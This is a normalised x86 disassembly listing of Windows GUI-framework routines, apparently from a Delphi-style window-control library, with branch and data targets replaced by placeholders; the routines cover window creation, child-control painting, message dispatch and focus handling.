mov [ ebp - 0x64 ] sub_43d1b8
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cec4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cec4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408b3c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_446ef4
push 0x1
mov eax [ esi + 0x68 ]
call sub_422f68
mov ecx eax
mov edx 0x30
mov eax esi
call sub_441578
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_446be4
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443d2c
lea eax [ ebp - 0xc0 ]
call sub_403f9c
retn
mov eax esi
mov si 0xffee
call sub_403448
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_443d34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d8c
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_443d74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e068
mov eax esi
call sub_41dfb8
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41dfb8
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41e070
pop esi
pop ebx
retn
sub_443dac
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f8b4
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f840
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f840
mov eax esi
call sub_41f8bc
add esp 0x10
pop esi
pop ebx
retn
sub_443e14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_443e00
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a238
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a238
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_443eec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4418b0
mov eax [ ebp - 0x8 ]
push eax
push sub_443d74
mov eax [ ebp - 0x8 ]
push eax
push sub_443dac
push ebp
call sub_443e14
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443f48
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_440338
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408af0
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408b04
mov ecx eax
mov edx edi
mov eax ebx
call sub_440348
mov eax r-xdata
call sub_408b10
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43edec
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_443fa0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_443fed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443ff4
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cec4
sub_444004
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41a294
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_41a238
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44404c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_444004
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4438a0
call sub_43fa18
inc edi
dec esi
jne r-xdata
sub_4440e8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_444104
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_41a238
call sub_444104
inc edi
dec esi
jne r-xdata
sub_444164
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403448
mov ebx eax
mov eax edi
call sub_444104
mov eax edi
call sub_4442a0
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_4441a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44427a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_441578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a238
call sub_4441a4
inc esi
dec ebx
jne r-xdata
sub_4442a0
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4441a4
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4442e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_444104
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_4442a0
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441578
jmp r-xdata
sub_444368
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4443c0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4443af
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4443b6
call sub_43edec
call sub_4273c8
retn
sub_4443e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_418ddc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406d5c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_441578
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_444498
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_41a238
call sub_4443e0
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_41a238
call sub_4443e0
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44452c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_446be4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406d48
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_444498
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d5c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_441578
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_4445c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_440b34
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_441644
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44452c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406d48
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43ff08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_444498
test eax eax
je r-xdata
mov eax ebx
call sub_457218
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_441644
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_446be4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_446be4
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_441578
sub_444724
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4417d8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_441578
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_423718
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_423754
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43ff64
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44482c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43d2a4
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_441578
mov [ esi + 0xc ] eax
mov bl 0x1
sub_444860
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_444980
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4449b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444987
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a238
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4449b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41a294
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_41a238
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418e04
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_41a238
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_422a94
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_418e04
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_422a94
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418e04
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43ed00
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_441578
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_444be8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43ed00
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_441578
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_441578
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43ed00
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_444be8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_41a238
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_444d3c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444860
jmp r-xdata
mov eax ebx
call sub_4438dc
test eax eax
